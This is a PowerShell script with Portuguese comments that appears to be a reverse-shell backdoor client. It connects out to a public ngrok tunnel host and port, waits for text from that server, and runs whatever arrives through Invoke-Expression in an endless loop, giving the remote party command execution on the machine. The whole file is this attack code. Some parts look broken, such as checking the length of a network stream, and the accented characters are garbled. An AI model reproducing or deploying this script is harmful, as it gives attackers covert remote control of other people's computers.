function Receber-Dados {
    param (
        [System.IO.Stream]$stream,
        [System.Text.StringBuilder]$buffer
    )

    $reader = New-Object System.IO.BinaryReader($stream)

    Write-Host "Verificando dados dispon�veis no stream..."
    if ($stream.DataAvailable) {
        Write-Host "Dados dispon�veis no stream. Lendo bytes..."
        $byteArray = $reader.ReadBytes(1024)

        if ($byteArray.Length -gt 0) {
            # Converte bytes para string, assumindo que a mensagem � uma string UTF-8
            $mensagemParcial = [System.Text.Encoding]::UTF8.GetString($byteArray)
            Write-Host "Dados lidos: $mensagemParcial"
            
            # Adiciona a mensagem parcial ao buffer
            $buffer.Append($mensagemParcial) | Out-Null
        } else {
            Write-Host "Nenhum dado lido do byteArray."
        }
    } else {
        Write-Host "Nenhum dado dispon�vel no stream."
    }
}

function Processar-Mensagem {
    param (
        [string]$mensagemCompleta
    )

    Write-Host "Mensagem recebida (antes de executar): '$mensagemCompleta'"

    if ($mensagemCompleta -match '^\s*[^&\|<>\n]+\s*$') {
        try {
            # Executa a mensagem como comando
            Write-Host "Executando comando: $mensagemCompleta"
            $resultado = Invoke-Expression $mensagemCompleta
            Write-Host "Resultado do comando: $resultado"
        } catch {
            Write-Host "Erro ao executar o comando: $_"
        }
    } else {
        Write-Host "Mensagem inv�lida para execu��o. Ignorando..."
    }
}

try {
    # Cria um socket TCP
    Write-Host "Criando socket TCP..."
    $socket = New-Object System.Net.Sockets.TcpClient

    # Conecta ao servidor
    $servidor = "0.tcp.sa.ngrok.io"
    $port = 10359
    try {
        Write-Host "Conectando ao servidor $servidor na porta $port..."
        $socket.Connect($servidor, $port)
        Write-Host "Conectado ao servidor $servidor na porta $port."
    } catch {
        Write-Host "Erro ao conectar ao servidor: $_"
        exit
    }

    # Obt�m o stream de rede para leitura e escrita
    Write-Host "Obtendo o stream de rede..."
    $stream = $socket.GetStream()

    # Cria um BinaryReader para ler dados em formato de bytes
    $reader = New-Object System.IO.BinaryReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    Write-Host "Preparado para receber e enviar mensagens."

    # Buffer para armazenar dados recebidos
    $buffer = New-Object System.Text.StringBuilder
    $timeout = 5000  # Tempo m�ximo de espera por dados em milissegundos
    $minBytesToReceive = 1024  # N�mero m�nimo de bytes a serem verificados

    # Loop para receber mensagens e executar comandos
    while ($true) {
        try {
            $startTime = [System.Diagnostics.Stopwatch]::GetTimestamp()
            $dataAvailable = $false

            # Verifica se h� dados dispon�veis maiores que o n�mero m�nimo
            Write-Host "Verificando se h� dados maiores que $minBytesToReceive bytes..."
            if ($stream.DataAvailable -and $stream.Length -ge $minBytesToReceive) {
                Write-Host "Dados dispon�veis no stream. Lendo bytes..."
                Receber-Dados -stream $stream -buffer $buffer
                $dataAvailable = $true
            }

            # Verifica o tempo limite
            Write-Host "Iniciando verifica��o de tempo limite..."
            while ($true) {
                $currentTime = [System.Diagnostics.Stopwatch]::GetTimestamp()
                $elapsed = ([System.Diagnostics.Stopwatch]::GetTimestamp() - $startTime) / [System.Diagnostics.Stopwatch]::Frequency * 1000

                if ($elapsed -ge $timeout) {
                    # Tempo limite atingido
                    Write-Host "Tempo limite alcan�ado. Nenhum dado recebido."
                    break
                }

                if ($stream.DataAvailable -and $stream.Length -ge $minBytesToReceive) {
                    Write-Host "Dados dispon�veis no stream. Lendo bytes..."
                    $dataAvailable = $true
                    Receber-Dados -stream $stream -buffer $buffer
                }

                # Verifica se o servidor foi desconectado
                if (!$socket.Connected) {
                    Write-Host "Servidor desconectado."
                    break
                }

                Start-Sleep -Milliseconds 100
            }

            if ($dataAvailable -or $buffer.Length -gt 0) {
                # Processa o buffer atual
                if ($buffer.Length -gt 0) {
                    $mensagemCompleta = $buffer.ToString().Trim()
                    Write-Host "Mensagem recebida completa: $mensagemCompleta"
                    $buffer.Clear()

                    # Processa a mensagem
                    Write-Host "Iniciando execu��o do comando..."
                    Processar-Mensagem -mensagemCompleta $mensagemCompleta
                }
            }

        } catch {
            Write-Host "Erro na leitura dos bytes: $_"
            break
        }
    }
} catch {
    Write-Host "Erro geral: $_"
} finally {
    # Verifica se o socket est� aberto antes de tentar fechar
    if ($socket -ne $null -and $socket.Connected) {
        try {
            Write-Host "Fechando conex�o..."
            $socket.Close()
            Write-Host "Conex�o fechada."
        } catch {
            Write-Host "Erro ao fechar a conex�o: $_"
        }
    }
}